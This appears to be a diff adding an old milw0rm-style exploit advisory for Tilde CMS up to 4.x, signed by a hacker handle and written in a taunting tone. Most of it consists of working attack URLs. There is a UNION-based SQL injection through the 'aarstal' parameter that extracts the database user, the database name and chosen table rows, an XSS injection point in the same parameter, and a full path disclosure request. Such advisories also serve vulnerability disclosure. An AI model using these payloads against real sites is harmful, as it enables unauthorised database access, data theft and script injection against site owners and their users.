@@ -1,0 +1,59 @@
+---------------------------------------------------------------
+ ____            __________         __             ____  __   
+/_   | ____     |__\_____  \  _____/  |_          /_   |/  |_ 
+ |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\
+ |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |  
+ |___|___|  /\__|  /______  /\___  >__|            |___||__|  
+          \/\______|      \/     \/                         
+---------------------------------------------------------------
+
+Http://www.inj3ct-it.org 	     Staff[at]inj3ct-it[dot]org 
+
+Original Here: http://www.inj3ct-it.org/exploit/tilde.txt
+
+---------------------------------------------------------------
+
+Tilde CMS <= v. 4.x "aarstal" parameter SQL Injection
+
+---------------------------------------------------------------
+
+#By KiNgOfThEwOrLd				
+
+---------------------------------------------------------------
+PoC
+
+D'u need an explanation?!? i don't think so :P
+---------------------------------------------------------------
+SQL Injection
+
+http://[target]/[tilde_path]/index.php?id=[id]&mode=yeardetail&aarstal=%27
+
+Little examples
+
+Using user() and database() functions u can get some informations about the 
+database...as:
+
+http://[target]/[tilde_path]/index.php?id=[yeardetail_id]
+&mode=yeardetail&aarstal=999/**/union/**/select/**/1,2,user(),database(),5/*
+
+Or u can get some recordes by the database like:
+
+http://[target]/[tilde_path]/index.php?id=[id]
+&mode=yeardetail&aarstal=999/**/union/**/select/**/1,2,[row_name],4,[row_name]
+/**/from/**/[table_name]/*
+
+D'u want the tables n' the rows? Find it yourself ;P
+---------------------------------------------------------------
+something else..
+
+Xss Vulnerability
+
+http://[target]/[tilde_path]/index.php?id=[id]&mode=yeardetail&aarstal=[XSS]
+---------------------------------------------------------------
+Full Path Disclosure
+
+http://[target]/[tilde_path]/index.php?search=%
+3C&mode=search&sider=on&tss=on&linier=on
+---------------------------------------------------------------
+
+# milw0rm.com [2007-11-26]
